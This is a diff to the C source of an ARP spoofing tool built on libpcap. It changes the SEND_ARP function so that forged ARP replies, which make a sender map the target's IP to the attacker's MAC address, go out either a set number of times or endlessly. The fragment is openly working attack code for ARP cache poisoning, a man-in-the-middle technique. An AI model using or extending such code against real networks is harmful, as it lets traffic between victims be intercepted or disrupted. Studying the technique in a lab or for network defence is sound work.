@@ -125,7 +125,7 @@ int GET_SENDER_MAC(uint8_t *sender_MAC_array, int sender_IP_int, pcap_t *handle,
 	return 1; 
 }
 
-int SEND_ARP(char *dev, char *sender_IP_char, char *target_IP_char)
+int SEND_ARP(char *dev, char *sender_IP_char, char *target_IP_char, int count)
 {
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
@@ -223,12 +223,27 @@ int SEND_ARP(char *dev, char *sender_IP_char, char *target_IP_char)
 	printf("[+] Repetitively sending fake ARP reply to sender: sender <%s> will now identify target <%s> MAC as attacker MAC <", sender_IP_char, target_IP_char); PRINT_MAC(attacker_MAC_array); printf(">");
 	puts("");
 
-	while (1)
+	if (count < 0)
 	{
-		pcap_sendpacket(handle, arp_reply_packet, sizeof(my_etharp_hdr));
-		puts(".");
-		sleep(1);
+		while(1)
+		{
+			pcap_sendpacket(handle, arp_reply_packet, sizeof(my_etharp_hdr));
+			puts(".");
+			sleep(1);
+		}
 	}
+
+	else
+	{
+		for (int i = 0; i < count; i++)
+		{
+			pcap_sendpacket(handle, arp_reply_packet, sizeof(my_etharp_hdr));
+			puts(".");
+			sleep(1);
+		}
+		printf("[+] Sent %d ARP replies!", count); puts("");
+	}
+
 
 
 	pcap_close(handle);
